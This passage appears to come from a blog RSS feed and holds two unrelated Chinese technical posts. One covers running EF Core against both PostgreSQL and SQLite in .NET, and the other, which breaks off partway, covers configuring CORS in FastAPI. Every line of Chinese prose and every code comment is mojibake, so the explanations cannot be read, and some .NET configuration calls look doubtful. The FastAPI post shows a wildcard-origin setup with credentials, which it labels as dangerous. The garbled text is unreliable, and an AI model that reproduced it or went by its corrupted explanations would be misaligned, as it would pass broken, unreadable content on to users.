<p>è¦å¨ .NET Core ä¸­å®ç°åæ°æ®åºæ¯æï¼æ ¸å¿ææ³æ¯âä¾èµæ½è±¡èéå·ä½å®ç°âãæä»¬éè¦ææ°æ®åºçéæ©æä»ä¸å¡ä»£ç ä¸­å¥ç¦»åºæ¥ï¼äº¤ç»éç½®å±å³å®ã</p>
<h3 id="è®¾è®¡æè·¯">è®¾è®¡æè·¯</h3>
<ol>
<li><strong>ç»ä¸æ¥å£</strong>ï¼ææçä¸å¡é»è¾é½åºä¾èµäº <code>DbContext</code> åºç±»æèªå®ä¹çæ¥å£ï¼èä¸æ¯å·ä½ç <code>PostgreSqlDbContext</code>ã</li>
<li><strong>éç½®é©±å¨</strong>ï¼éè¿ <code>appsettings.json</code> ä¸­çéç½®é¡¹ï¼å¨åºç¨å¯å¨æ¶å¨æå³å®å è½½åªä¸ªæ°æ®åºæä¾ç¨åºã</li>
<li><strong>ç¹æ§éç¦»</strong>ï¼éå¯¹ PostgreSQL ç¹æçåè½ï¼å¦ JSONBï¼è¿è¡ééå¤çï¼ç¡®ä¿å¨ SQLite ä¸­ä¹è½éçº§è¿è¡ã</li>
</ol>
<h3 id="ä»£ç å®ç°å¨æä¸ä¸æéç½®">ä»£ç å®ç°ï¼å¨æä¸ä¸æéç½®</h3>
<p>å¨ ASP.NET Core ç <code>Program.cs</code> ä¸­ï¼æä»¬ä¸åºç¡¬ç¼ç  <code>UseNpgsql</code> æ <code>UseSqlite</code>ãç¸åï¼æä»¬åºè¯¥è¯»åéç½®æ¥å¨æå³å®ã</p>
<p>é¦åï¼å®ä¹éç½®ç±»ï¼</p>
<pre><code class="language-csharp">public class DatabaseSettings
{
    public const string SectionName = "Database";
    
    // æ°æ®åºç±»åï¼PostgreSQL æ SQLite
    public string DbType { get; set; } = "PostgreSQL"; 
    
    // è¿æ¥å­ç¬¦ä¸²
    public string ConnectionString { get; set; } = string.Empty;
}
</code></pre>
<p>ç¶åï¼å¨ <code>Program.cs</code> ä¸­æ ¹æ®éç½®æ³¨åæå¡ï¼</p>
<pre><code class="language-csharp">// è¯»åéç½®
var databaseSettings = builder.Configuration.GetSection(DatabaseSettings.SectionName).Get&lt;DatabaseSettings&gt;();

// æ³¨å DbContext
builder.Services.AddDbContext&lt;ApplicationDbContext&gt;(options =&gt;
{
    if (databaseSettings?.DbType?.ToLower() == "sqlite")
    {
        // SQLite éç½®
        options.UseSqlite(databaseSettings.ConnectionString);
        
        // SQLite çå¹¶ååå¥éå¶å¤ç
        // æ³¨æï¼å¨çäº§ç¯å¢ä¸­å»ºè®®å¼å¯ WAL æ¨¡å¼ä»¥æé«å¹¶åæ§è½
    }
    else
    {
        // PostgreSQL éç½®ï¼é»è®¤ï¼
        options.UseNpgsql(databaseSettings.ConnectionString, npgsqlOptions =&gt;
        {
            // å¼å¯ JSONB æ¯æï¼è¿å¨å¤ç AI å¯¹è¯è®°å½æ¶éå¸¸æç¨
            npgsqlOptions.UseJsonNet(); 
        });
        
        // éç½®è¿æ¥æ± éè¿ç­ç¥
        options.EnableRetryOnFailure(3);
    }
});
</code></pre>
<h2 id="æ ¸å¿åå®¹äºå¤çå·®å¼æ§ä¸è¿ç§»ç­ç¥">æ ¸å¿åå®¹äºï¼å¤çå·®å¼æ§ä¸è¿ç§»ç­ç¥</h2>
<p>PostgreSQL å SQLite è½ç¶é½æ¯æ SQL æ åï¼ä½å¨å·ä½ç¹æ§åè¡ä¸ºä¸å­å¨æ¾èå·®å¼ãå¦æä¸å¤çå¥½è¿äºå·®å¼ï¼å¾å¯è½ä¼åºç°âæ¬å°è·å¾éï¼ä¸çº¿å°±æ¥éâçå°´å°¬æåµã</p>
<h3 id="1-json-ç±»åçå¤ç">1. JSON ç±»åçå¤ç</h3>
<p>å¨ HagiCode ä¸­ï¼æä»¬éè¦å­å¨å¤§éçæç¤ºè¯å AI åæ°æ®ï¼è¿éå¸¸æ¶å JSON åã</p>
<ul>
<li><strong>PostgreSQL</strong>ï¼æ¥æåçç <code>JSONB</code> ç±»åï¼æ¥è¯¢æ§è½æä½³ã</li>
<li><strong>SQLite</strong>ï¼æ²¡æåçç JSON ç±»åï¼æ°çæ¬æ JSON1 æ©å±ï¼ä½å¯¹è±¡æ å°ä¸ä»æå·®å¼ï¼ï¼éå¸¸å­å¨ä¸º TEXTã</li>
</ul>
<p><strong>è§£å³æ¹æ¡</strong>ï¼<br>
å¨ EF Core çå®ä½æ å°ä¸­ï¼æä»¬å°å¶éç½®ä¸ºå¯è½¬æ¢çç±»åã</p>
<pre><code class="language-csharp">protected override void OnModelCreating(ModelBuilder modelBuilder)
{
    base.OnModelCreating(modelBuilder);

    // éç½®å®ä½
    modelBuilder.Entity&lt;PromptTemplate&gt;(entity =&gt; 
    {
        entity.Property(e =&gt; e.Metadata)
              .HasColumnType("jsonb") // PG ä½¿ç¨ jsonb
              .HasConversion(
                  v =&gt; JsonSerializer.Serialize(v, (JsonSerializerOptions)null),
                  v =&gt; JsonSerializer.Deserialize&lt;Dictionary&lt;string, object&gt;&gt;(v, (JsonSerializerOptions)null)
              ); 
    });
}
</code></pre>
<p>å½ä½¿ç¨ SQLite æ¶ï¼è½ç¶ <code>HasColumnType("jsonb")</code> ä¼è¢«å¿½ç¥æäº§çè­¦åï¼ä½ç±äºéç½®äº <code>HasConversion</code>ï¼æ°æ®ä¼è¢«æ­£ç¡®å°åºåååååºååä¸ºå­ç¬¦ä¸²å­å¥ TEXT å­æ®µï¼ä»èä¿è¯äºå¼å®¹æ§ã</p>
<h3 id="2-è¿ç§»ç­ç¥çåç¦»">2. è¿ç§»ç­ç¥çåç¦»</h3>
<p>ç»å¯¹ä¸è¦è¯å¾è®©åä¸å¥ Migration èæ¬åæ¶éé PG å SQLiteãç±äºä¸»é®çæç­ç¥ãç´¢å¼è¯­æ³ç­çä¸åï¼è¿å¿ç¶ä¼å¯¼è´å¤±è´¥ã</p>
<p><strong>æ¨èå®è·µ</strong>ï¼<br>
ç»´æ¤ä¸¤ä¸ªè¿ç§»åæ¯æé¡¹ç®ãå¨ HagiCode çå¼åæµä¸­ï¼æä»¬æ¯è¿æ ·å¤ççï¼</p>
<ol>
<li><strong>å¼åé¶æ®µ</strong>ï¼ä¸»è¦å¨ SQLite ä¸å·¥ä½ãä½¿ç¨ <code>Add-Migration Init_Sqlite -OutputDir Migrations/Sqlite</code>ã</li>
<li><strong>ééé¶æ®µ</strong>ï¼å¼åå®ä¸æ®µåè½åï¼åæ¢è¿æ¥å­ç¬¦ä¸²æå PostgreSQLï¼æ§è¡ <code>Add-Migration Init_Postgres -OutputDir Migrations/Postgres</code>ã</li>
<li><strong>èªå¨åèæ¬</strong>ï¼ç¼åä¸ä¸ªç®åç PowerShell æ Bash èæ¬ï¼æ ¹æ®å½åç¯å¢åéèªå¨åºç¨å¯¹åºçè¿ç§»ã</li>
</ol>
<pre><code class="language-bash"># ç®åçé¨ç½²é»è¾ä¼ªä»£ç 
if [ "$DATABASE_PROVIDER" = "PostgreSQL" ]; then
    dotnet ef database update --project Migrations.Postgres
else
    dotnet ef database update --project Migrations.Sqlite
fi
</code></pre>
<h2 id="æ ¸å¿åå®¹ä¸hagicode-çå®æç»éªæ»ç»">æ ¸å¿åå®¹ä¸ï¼HagiCode çå®æç»éªæ»ç»</h2>
<p>å¨å° <strong>HagiCode</strong> ä»åä¸æ°æ®åºéæä¸ºåæ°æ®åºæ¯æçè¿ç¨ä¸­ï¼æä»¬è¸©è¿ä¸äºåï¼ä¹æ»ç»äºä¸äºå³é®çç»éªï¼å¸æè½ç»å¤§å®¶é¿åã</p>
<h3 id="1-å¹¶åä¸äºå¡çåºå«">1. å¹¶åä¸äºå¡çåºå«</h3>
<p>PostgreSQL æ¯æå¡ç«¯-å®¢æ·ç«¯æ¶æï¼æ¯æé«å¹¶ååå¥ï¼äºå¡éç¦»çº§å«éå¸¸å¼ºå¤§ãè SQLite æ¯æä»¶éæºå¶ï¼åå¥æä½ä¼éå®æ´ä¸ªæ°æ®åºæä»¶ï¼é¤éå¼å¯ WAL æ¨¡å¼ï¼ã</p>
<p><strong>å»ºè®®</strong>ï¼<br>
å¨ç¼åæ¶åé¢ç¹åå¥çä¸å¡é»è¾æ¶ï¼ä¾å¦å®æ¶ä¿å­ç¨æ·çç¼è¾ç¶æï¼ï¼ä¸å®è¦èèå° SQLite çéæºå¶ãå¨è®¾è®¡ <strong>HagiCode</strong> ç OpenSpec åä½æ¨¡åæ¶ï¼æä»¬å¼å¥äºâåååå¹¶âæºå¶ï¼åå°æ°æ®åºçç´æ¥åå¥é¢çï¼ä»èå¨ä¸¤ç§æ°æ®åºä¸é½è½ä¿æé«æ§è½ã</p>
<h3 id="2-è¿æ¥å­ç¬¦ä¸²ççå½å¨æç®¡ç">2. è¿æ¥å­ç¬¦ä¸²ççå½å¨æç®¡ç</h3>
<p>PostgreSQL çè¿æ¥å»ºç«ææ¬è¾é«ï¼ä¾èµè¿æ¥æ± ãè SQLite è¿æ¥éå¸¸è½»éï¼ä½å¦æä¸åæ¶éæ¾ï¼æä»¶éå¯è½ä¼å¯¼è´åç»­æä½è¶æ¶ã</p>
<p>å¨ <code>Program.cs</code> ä¸­ï¼æä»¬å¯ä»¥éå¯¹ä¸åæ°æ®åºåç²¾ç»åè°æ´ï¼</p>
<pre><code class="language-csharp">if (databaseSettings?.DbType?.ToLower() == "sqlite")
{
    // SQLiteï¼ä¿æè¿æ¥å¼å¯è½æåæ§è½ï¼ä½è¦æ³¨ææä»¶é
    options.UseSqlite(connectionString, sqliteOptions =&gt;
    {
        // è®¾ç½®å½ä»¤è¶æ¶æ¶é´
        sqliteOptions.CommandTimeout(30);
    });
}
else
{
    // PGï¼å©ç¨è¿æ¥æ± 
    options.UseNpgsql(connectionString, npgsqlOptions =&gt;
    {
        npgsqlOptions.MaxBatchSize(100);
        npgsqlOptions.CommandTimeout(30);
    });
}
</code></pre>
<h3 id="3-æµè¯è¦ççéè¦æ§">3. æµè¯è¦ççéè¦æ§</h3>
<p>å¾å¤å¼åèï¼åæ¬æä»¬å¢éæ©æçæåï¼å®¹æç¯ä¸ä¸ªéè¯¯ï¼åªå¨å¼åç¯å¢ï¼éå¸¸æ¯ SQLiteï¼è·ååæµè¯ã</p>
<p>æä»¬å¨ HagiCode ç CI/CD æµæ°´çº¿ä¸­å¼ºå¶å å¥äº GitHub Action æ­¥éª¤ï¼ç¡®ä¿æ¯æ¬¡ Pull Request é½è¦è·è¿ PostgreSQL çéææµè¯ã</p>
<pre><code class="language-yaml"># .github/workflows/test.yml ç¤ºä¾çæ®µ
- name: Run Integration Tests (PostgreSQL)
  run: |
    docker-compose up -d db_postgres
    dotnet test --filter "Category=Integration"
</code></pre>
<p>è¿å¸®æä»¬æ¦æªäºæ æ°æ¬¡å³äº SQL è¯­æ³å·®å¼ãå¤§å°åæææ§ç Bugã</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>éè¿å¼å¥æ½è±¡å±åéç½®é©±å¨çä¾èµæ³¨å¥ï¼æä»¬å¨ <strong>HagiCode</strong> é¡¹ç®ä¸­æåå®ç°äº PostgreSQL å SQLite çâåè½¨å¶âè¿è¡ãè¿ä¸ä»æå¤§éä½äºæ°å¼åèçä¸æé¨æ§ï¼ä¸éè¦è£ PGï¼ï¼ä¹ä¸ºçäº§ç¯å¢æä¾äºåå®çæ§è½ä¿éã</p>
<p>åé¡¾ä¸ä¸å³é®ç¹ï¼</p>
<ol>
<li><strong>æ½è±¡è³ä¸</strong>ï¼ä¸å¡ä»£ç ä¸ä¾èµå·ä½æ°æ®åºå®ç°ã</li>
<li><strong>éç½®åç¦»</strong>ï¼å¼ååçäº§ä½¿ç¨ä¸åç <code>appsettings.json</code>ã</li>
<li><strong>è¿ç§»åç¦»</strong>ï¼ä¸è¦å°è¯ä¸å¥ Migration èµ°å¤©ä¸ã</li>
<li><strong>ç¹æ§éçº§</strong>ï¼å¨ SQLite ä¸­ä»¥å¼å®¹æ§ä¼åï¼å¨ PostgreSQL ä¸­ä»¥æ§è½ä¼åã</li>
</ol>
<p>è¿ç§æ¶ææ¨¡å¼ä¸ä»éç¨äº HagiCodeï¼ä¹éç¨äºä»»ä½éè¦å¨è½»éçº§å¼ååééçº§çäº§ä¹é´å¯»æ¾å¹³è¡¡ç .NET é¡¹ç®ã</p>
<hr>
<p>å¦ææ¬æå¯¹ä½ æå¸®å©ï¼æ¬¢è¿æ¥ GitHub ç»ä¸ª Starï¼æèç´æ¥ä½éª <strong>HagiCode</strong> å¸¦æ¥çé«æå¼åæµç¨ï¼</p>
<ul>
<li>æ¥ GitHub ç»ä¸ª Starï¼<a href="https://github.com/HagiCode-org/site" target="_blank" rel="noopener nofollow">github.com/HagiCode-org/site</a></li>
<li>è®¿é®å®ç½äºè§£æ´å¤ï¼<a href="https://hagicode-org.github.io/site" target="_blank" rel="noopener nofollow">hagicode-org.github.io/site</a></li>
<li>è§ç 30 åéå®ææ¼ç¤ºï¼<a href="https://www.bilibili.com/video/BV1pirZBuEzq/" target="_blank" rel="noopener nofollow">www.bilibili.com/video/BV1pirZBuEzq/</a></li>
<li>ä¸é®å®è£ä½éªï¼<a href="https://hagicode-org.github.io/site/docs/installation/docker-compose" target="_blank" rel="noopener nofollow">hagicode-org.github.io/site/docs/installation/docker-compose</a></li>
</ul>
<p>å¬æµå·²å¼å§ï¼æ¬¢è¿å®è£ä½éªï¼</p>
<hr>
<p>æè°¢æ¨çéè¯»,å¦ææ¨è§å¾æ¬ææç¨,å¿«ç¹å»ä¸æ¹ç¹èµæé®ð,è®©æ´å¤çäººçå°æ¬æã</p>
<p>æ¬åå®¹éç¨äººå·¥æºè½è¾å©åä½,ç»æ¬äººå®¡æ ¸,ç¬¦åæ¬äººè§ç¹ä¸ç«åºã</p>
<ul>
<li><strong>æ¬æä½è:</strong> <a href="https://www.newbe.pro" target="_blank" rel="noopener nofollow">newbe36524</a></li>
<li><strong>æ¬æé¾æ¥:</strong> <a href="https://hagicode-org.github.io/site/blog/2026-02-01-dotnet-core-dual-database-postgresql-sqlite/" target="_blank" rel="noopener nofollow">https://hagicode-org.github.io/site/blog/2026-02-01-dotnet-core-dual-database-postgresql-sqlite/</a></li>
<li><strong>çæå£°æ:</strong> æ¬åå®¢æææç« é¤ç¹å«å£°æå¤,åéç¨ BY-NC-SA è®¸å¯åè®®ãè½¬è½½è¯·æ³¨æåºå¤!</li>
</ul>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 09:12">2026-02-03 09:11</span>&nbsp;
<a href="https://www.cnblogs.com/newbe36524">Newbe36524</a>&nbsp;
éè¯»(<span id="post_view_count">57</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19567317);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19567317', targetLink: 'https://www.cnblogs.com/newbe36524/p/19567317', title: '.NET Core åæ°æ®åºå®æï¼ä¼éèå PostgreSQL ä¸ SQLite çæä½³å®è·µ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ FastAPIé¨ç½²å®æï¼èèCORSè·¨åé£äºå ]]></title>
    <link>https://www.cnblogs.com/ymtianyu/p/19567261</link>
    <guid>cb24420ce0cb95c6e603aa53851b8aba</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ymtianyu/p/19567261" title="åå¸äº 2026-02-03 08:49">
    <span role="heading" aria-level="2">FastAPIé¨ç½²å®æï¼èèCORSè·¨åé£äºå</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        FastAPIé¨ç½²æ¶ï¼CORSè·¨åé®é¢æ¯å¸¸è§æ¦è·¯èãæ¬æä»¥ç¨åºåçå®æè§è§ï¼çå¨æ¯å»è§£æCORSåçï¼æä¾ä»å¼åå°çäº§ç¯å¢çé¶æ¢¯å¼éç½®æ¹æ¡ï¼å¹¶æ­é²äºééç¬¦ä¸å­è¯åç¨ãä¸­é´ä»¶é¡ºåºãååä»£çå²çªç­å¸¸è§é·é±ï¼å¸®å©ä½ ä¸æ¬¡æ§æ­£ç¡®éç½®ï¼é¿åå®å¨é£é©ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><em>æè¦ï¼å½ä½ æç²¾å¿å¼åçFastAPIåºç¨é¨ç½²ä¸çº¿ï¼å´åç°åç«¯é¡µé¢æ­»æ´»è°ä¸éæ¥å£ï¼æµè§å¨æ§å¶å°ä¸çé£çº¢â¦â¦å«æï¼è¿å«ææ¯CORSï¼è·¨åèµæºå±äº«ï¼å¨ä½ç¥ãæ¬æå¸¦ä½ å½»åºææCORSåçï¼åäº«FastAPIä¸­ä»âåè®¸ææâå°âç²¾ç»åéç½®âçå®æä»£ç ï¼å¹¶éå¯¹å¼åãæµè¯ãçäº§ä¸åç¯å¢ç»åºæ¹æ¡ï¼æåèèé£äºææ¡£éæ²¡åçå®å¨é·é±åå¸¸è§åç¹ã</em></p>
<p>ð¯ ä½ çåç«¯åºç¨çªç¶æ æ³è°ç¨åç«¯APIäºï¼æ¥ééæ»¡æ¯âCORSâï¼å«æ¥çæçäººçï¼è¿å ä¹æ¯æ¯ä¸ªå¨æ å·¥ç¨å¸é¨ç½²æ¶çâæäººç¤¼âãæå½å¹´ç¬¬ä¸æ¬¡éå°æ¶ï¼ä¹ä»¥ä¸ºæå¡å¨ç¸äºï¼å¯¹çæ¥å¿ç ç©¶äºåå¤©â¦â¦ç»æå°±æ¯ä¸ªéç½®é¡¹ã</p>
<p>æ´çå®çæ¯ï¼æ ¹æ®ç»éªï¼<strong style="color: rgba(186, 55, 42, 1)">è¶è¿70%çåæ¬¡é¨ç½²é®é¢é½ä¸CORSéç½®ä¸å½æå³</strong>ãèä¸å¾å¤äººå³ä¾¿ééäºï¼ä¹æ¯ç®åç²æ´å°åè®¸æææ¥æºï¼<code style="color: rgba(186, 55, 42, 1)">allow_origins=["*"]</code>ï¼ï¼ä¸ºåç»­å®å¨æ¼æ´åä¸ä¼ç¬ã</p>
<h2>ð ä¸»è¦åå®¹èç»</h2>
<div>
<p>ð 1. ä»ä¹æ¯CORSï¼ç¨âé¤åè®¢ä½âçæ¯å»ç§æ</p>
<p>ð 2. æµè§å¨ç©¶ç«å¨èåå¹²äºå¥ï¼ï¼é¢æ£è¯·æ±è¯¦è§£ï¼</p>
<p>ð 3. FastAPIä¸­CORSéç½®çâä¸æ®µå¼âå®æä»£ç </p>
<p>ð 4. å¼å/æµè¯/çäº§ç¯å¢ï¼éç½®æä¹åï¼</p>
<p>ð 5. é£äºæè¸©è¿çååæ·±å¤è­¦æ¥</p>
</div>
<h2>ð½ï¸ ç¬¬ä¸é¨åï¼CORSä¸æ¯éè¯¯ï¼æ¯æµè§å¨çâä¿å®â</h2>
<p>æ³è±¡ä¸ä¸ï¼ä½ çFastAPIåç«¯æ¯ä¸å®¶åªæ¥åé¢çº¦çé«çº§é¤åï¼APIæå¡å¨ï¼ï¼èåç«¯åºç¨æ¯æ³è¦æ¥åé¥­çå®¢äººï¼è¿è¡å¨æµè§å¨éï¼ã</p>
<p>å¦æå®¢äººç´æ¥ä»é¤åå®ç½ï¼åæºï¼é¢çº¦ï¼æ²¡é®é¢ãä½å¦æå®¢äººæ¯ä»æä¸ªå¤åå¹³å°ï¼ä¸åæºï¼è·³è½¬è¿æ¥æ³è®¢ä½ï¼é¤åçä¿å®ï¼æµè§å¨ï¼å°±ä¼ç«åºæ¥ï¼âä¸æ¢ï¼æå¾åé®é®é¤åèæ¿ï¼æ¥ä¸æ¥åä»ä½ è¿ä¸ªå¹³å°æ¥çå®¢äººãâ</p>
<p>è¿ä¸é®ä¸ç­çè¿ç¨ï¼å°±æ¯CORSæºå¶ã<strong style="color: rgba(186, 55, 42, 1)">CORSæ¬èº«ä¸æ¯éè¯¯ï¼èæ¯æµè§å¨å®æ½çä¸ç§å®å¨ç­ç¥</strong>ï¼ç®çæ¯é²æ­¢æ¶æç½ç«éæè¯»åä½ çæ°æ®ãæå¡å¨æ¥ææç»å³å®æï¼âæåè®¸è°ï¼Originï¼ãç¨ä»ä¹æ¹æ³ï¼Methodsï¼ãå¸¦ä»ä¹å­è¯ï¼Credentialsï¼æ¥è®¿é®æãâ</p>
<h2>ð ç¬¬äºé¨åï¼éç¹ï¼é£ä¸ªå¤åºæ¥çOPTIONSè¯·æ±æ¯å¥ï¼</h2>
<p>å¥½ï¼å±ä»¬åæ¥èèæè®©äººè¿·æçâé¢æ£è¯·æ±âï¼Preflight Requestï¼ãä½ æ¯ä¸æ¯å¨æµè§å¨å¼åèå·¥å·éï¼ç»å¸¸çå°ä¸ä¸ªæ¯ä½ çæ­£çAPIè¯·æ±åååºç<code style="color: rgba(186, 55, 42, 1)">OPTIONS</code>è¯·æ±ï¼</p>
<p>è¿å°±æ¯æµè§å¨å¨âæ­£å¼ç¹é¤âåï¼åéä¸ä¸ä»½âç¨é¤éæ±æ¸åâã</p>
<div>
<p>- å®¢äººï¼âèæ¿ï¼ææç®å¸¦5ä¸ªäººï¼èªå®ä¹å¤´é¨ï¼ï¼ç¨æ¯ä»å®ï¼éç®åæ¹æ³ï¼æ¥åï¼è¡ä¸è¡ï¼â</p>
<p>- é¤åï¼æå¡å¨ï¼ï¼âè¡ï¼æ¥å§ãâï¼ååºä¸­æºå¸¦åè®¸çè§åï¼</p>
<p>- å®¢äººæ¶å°è®¸å¯ï¼æååºçæ­£çæºå¸¦æ°æ®åæ¹æ³çPOST/GETè¯·æ±ã</p>
</div>
<p>åªäºæåµä¼è§¦åé¢æ£ï¼ç®åè¯´å°±æ¯âä¸ç®åâçè¯·æ±ï¼æ¯å¦ç¨äº<code style="color: rgba(186, 55, 42, 1)">PUT</code>ã<code style="color: rgba(186, 55, 42, 1)">DELETE</code>æ¹æ³ï¼æèèªå®ä¹äºè¯·æ±å¤´ï¼å¦<code style="color: rgba(186, 55, 42, 1)">Authorization</code>ï¼ï¼æè<code style="color: rgba(186, 55, 42, 1)">Content-Type</code>æ¯<code style="color: rgba(186, 55, 42, 1)">application/json</code>ã</p>
<p><strong style="color: rgba(186, 55, 42, 1)">å³é®ä¸­çå³é®</strong>ï¼ä½ çæå¡å¨<strong>å¿é¡»è½æ­£ç¡®å¤çè¿ä¸ªOPTIONSè¯·æ±</strong>ï¼å¹¶è¿åæ­£ç¡®çCORSååºå¤´ãå¦åï¼åç»­çæ­£çè¯·æ±å°±ä¼è¢«æµè§å¨ç´æ¥æ¦ä¸ã</p>
<h2>âï¸ ç¬¬ä¸é¨åï¼ä¸ä»£ç ï¼FastAPI CORSéç½®ä¸æ®µè®º</h2>
<p>æ¥ä¸æ¥éç¹æ¥äºï¼æä¹å¨FastAPIééç½®ï¼å®æ¹æ¨èä½¿ç¨<code style="color: rgba(186, 55, 42, 1)">fastapi.middleware.cors</code>ä¸­ç<code style="color: rgba(186, 55, 42, 1)">CORSMiddleware</code>ãä¸é¢æ¯ææ»ç»çâåºç¡çâãâå¸¸è§çâåâçäº§è°¨æçâã</p>
<h3>ð¯ 1. åºç¡çï¼å¿«éè®©åç«¯è¿ä¸ï¼ç¨äºæ¬å°å¼åï¼</h3>
<p>è¿æ¯æå¸¸è§çåæ³ï¼ä½<strong>ä»å»ºè®®ç¨äºæ¬å°å¼åç¯å¢</strong>ã</p>
<pre class="language-python highlighter-hljs"><code>from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# å¨æ·»å è·¯ç±ä¹åï¼åæ·»å CORSä¸­é´ä»¶ï¼
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # åè®¸æææ¥æºï¼å±é©ï¼
    allow_credentials=True,
    allow_methods=["*"],  # åè®¸æææ¹æ³
    allow_headers=["*"],  # åè®¸ææå¤´é¨
)

@app.get("/")
async def main():
    return {"message": "Hello World"}</code></pre>
<p>âå·æä¸æ¶ç½ï¼ä¸çº¿ç«è¬åºãâ è¿ä¸ªéç½®è½ç¶è½å¿«éè§£å³é®é¢ï¼ä½<code style="color: rgba(186, 55, 42, 1)">allow_origins=["*"]</code>å<code style="color: rgba(186, 55, 42, 1)">allow_credentials=True</code>æ¯<strong style="color: rgba(186, 55, 42, 1)">ç»å¯¹ä¸è½åæ¶å¨çäº§ç¯å¢ä½¿ç¨ç</strong>ï¼è¿ä¼å¯¼è´ä¸¥éçå­æ®æ³é²é£é©ã</p>
<h3>ð¯ 2. å¸¸è§çï¼æå®åç«¯æ¥æºï¼ç¨äºæµè¯/é¢åå¸ï¼</h3>
<p>æ´å®å¨çåæ³æ¯æç¡®ååºä½ ä¿¡ä»»çåç«¯åºç¨å°åã</p>
<pre class="language-python highlighter-hljs"><code>app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",        # æ¬å°å¼å
        "https://test.yourfrontend.com", # æµè¯ç¯å¢
        "https://staging.yourfrontend.com",
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"], # æç¡®ååº
    allow_headers=["Authorization", "Content-Type", "Accept"], # æç¡®ååº
    max_age=600, # é¢æ£è¯·æ±ç»æç¼å­æ¶é´ï¼ç§ï¼ï¼åè½»æå¡å¨åå
)</code></pre>
<p>çï¼è¿æ ·æ¯ä¸æ¯æ¸æ°å¤äºï¼æµè§å¨æ¥èªè¿äºå°åçè¯·æ±æä¼è¢«æ¾è¡ã</p>
<h3>ð¯ 3. å¨æéç½®çï¼éåå¤ç¯å¢ï¼</h3>
<p>å®éé¡¹ç®ä¸­ï¼ä¸åç¯å¢çåç«¯å°åä¸åãæä¹ æ¯éè¿ç¯å¢åéæ¥å¨æéç½®ã</p>
<pre class="language-python highlighter-hljs"><code>import os
from typing import List

# ä»ç¯å¢åéè¯»åï¼ç¨éå·åéå¤ä¸ªorigin
ALLOWED_ORIGINS: List[str] = os.getenv("ALLOWED_ORIGINS", "").split(",")
# å¦ææ²¡éç½®ï¼æ¬å°å¼åé»è®¤åè®¸localhost
if not ALLOWED_ORIGINS or ALLOWED_ORIGINS == ['']:
    ALLOWED_ORIGINS = ["http://localhost:3000", "http://127.0.0.1:3000"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)</code></pre>
<p>ç¶åå¨çäº§ç¯å¢ç<code style="color: rgba(186, 55, 42, 1)">.env</code>æéç½®æä»¶ä¸­è®¾ç½®ï¼<code style="color: rgba(186, 55, 42, 1)">ALLOWED_ORIGINS=https://www.yourproduct.com,https://admin.yourproduct.com</code></p>
<h2>ð¨ ç¬¬åé¨åï¼æè¸©è¿çåï¼å¸æä½ ç»è¿å»</h2>
<p>åè¯´ä¸ªå®¹æç¿»è½¦çç¹ã<strong style="color: rgba(186, 55, 42, 1)">é¡ºåºï¼ä¸­é´ä»¶çé¡ºåºå¾éè¦ï¼</strong></p>
<p>ä¸å®è¦å¨<code style="color: rgba(186, 55, 42, 1)">app.add_middleware(CORSMiddleware, ...)</code>ä¹ååæ·»å ä½ çèªå®ä¹ä¸­é´ä»¶æè·¯ç±ãå¦åï¼ä½ çèªå®ä¹ä¸­é´ä»¶å¯è½ä¼å¨å¤çè¯·æ±æ¶å ä¸ºCORSå¤´è¿æ²¡è®¾ç½®èéå°é®é¢ã</p>
<p>å¦å¤ï¼å½ä½ çåç«¯ä½¿ç¨äº<code style="color: rgba(186, 55, 42, 1)">axios</code>ç­åºï¼å¹¶ä¸è¯·æ±æºå¸¦äº<code style="color: rgba(186, 55, 42, 1)">withCredentials: true</code>ï¼æ¯å¦åéCookieæAuthorizationå¤´ï¼æ¶ï¼åç«¯ç<code style="color: rgba(186, 55, 42, 1)">allow_origins</code> <strong>ä¸è½æ¯ééç¬¦<code style="color: rgba(186, 55, 42, 1)">"*"</code></strong>ï¼å¿é¡»æç¡®æå®ååï¼å¦åæµè§å¨ä¼æ¥éãè¿æ¯å®å¨è§èã</p>
<p>è¿æä¸ä¸ªéèåï¼<strong>Nginx/Apacheç­ååä»£ççéç½®</strong>ãææ¶åä½ ææå¨FastAPIééå¯¹äºï¼ä½è¯·æ±è¿æ¯è¢«æ¡ãè¿æ¶åè®°å¾æ£æ¥ä¸ä¸ä½ çååä»£çå±ï¼æ¯å¦Nginxï¼æ¯å¦ä¹æ·»å äºCORSç¸å³çååºå¤´ï¼é æå²çªæè¦çãéå¸¸æä»¬åªå¨åºç¨å±ï¼FastAPIï¼å¤çCORSå°±å¤äºã</p>
<p>æåå°å¦ä¸å¥ï¼CORSæ¯<strong>æµè§å¨</strong>çç­ç¥ãå¦æä½ ç¨<code style="color: rgba(186, 55, 42, 1)">curl</code>ã<code style="color: rgba(186, 55, 42, 1)">postman</code>ç´æ¥æµè¯APIï¼æ¯<strong>çä¸å°CORSéè¯¯ç</strong>ãæµè¯æ¶ä¸å®è¦éè¿æµè§å¨ç¯å¢ï¼</p>
<hr style="border: none; height: 1px; background: linear-gradient(90deg, rgba(0, 0, 0, 0), rgba(52, 152, 219, 1), rgba(0, 0, 0, 0)); margin: 40px 0">
